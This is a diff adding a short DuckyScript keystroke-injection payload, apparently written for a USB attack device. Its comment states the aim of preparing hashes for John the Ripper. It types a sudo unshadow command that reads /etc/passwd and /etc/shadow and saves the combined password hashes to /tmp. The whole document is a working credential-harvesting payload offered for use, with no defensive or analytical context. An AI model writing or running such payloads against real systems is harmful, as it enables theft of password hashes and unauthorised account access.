@@ -1,0 +1,4 @@
+REM Combine /etc/passwd and /etc/shadow for John cracking
+DELAY 500
+STRING sudo unshadow /etc/passwd /etc/shadow > /tmp/combined_hashes.txt && echo "Combined hashes saved to /tmp/combined_hashes.txt"
+ENTER
